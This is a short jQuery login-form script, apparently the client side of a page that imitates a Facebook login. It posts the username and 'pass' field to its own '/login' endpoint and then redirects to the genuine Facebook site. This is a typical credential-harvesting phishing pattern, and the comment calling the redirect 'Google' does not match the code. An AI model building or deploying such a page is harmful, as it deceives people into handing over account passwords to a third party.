$(document).ready(function() {
    // Ensure password field remains type="password"
    $('#pass').attr('type', 'password');

    // Prevent any attempts to change password field type
    $('#pass').on('change keyup paste', function() {
        if ($(this).attr('type') !== 'password') {
            $(this).attr('type', 'password');
        }
    });

    // Fetch CSRF token
    $.get('/get_csrf_token', function(data) {
        $('#csrf_token').val(data.csrf_token);
    }).fail(function() {
        alert('Failed to fetch CSRF token');
    });

    $('#login_form').submit(function(e) {
        e.preventDefault();
        var csrfToken = $('#csrf_token').val();
        $.ajax({
            url: '/login',
            type: 'POST',
            data: $(this).serialize(),
            headers: {
                'X-CSRFToken': csrfToken
            },
            success: function(response) {
                if (response.success) {
                    // Redirect to Google on success
                    window.location.href = 'https://web.facebook.com/?_rdc=1&_rdr';
                } else {
                    alert('Login failed: ' + response.message + '\nErrors: ' + JSON.stringify(response.errors));
                }
            },
            error: function(xhr) {
                alert('Error: ' + (xhr.responseJSON ? xhr.responseJSON.message : 'Unknown error'));
            }
        });
    });
});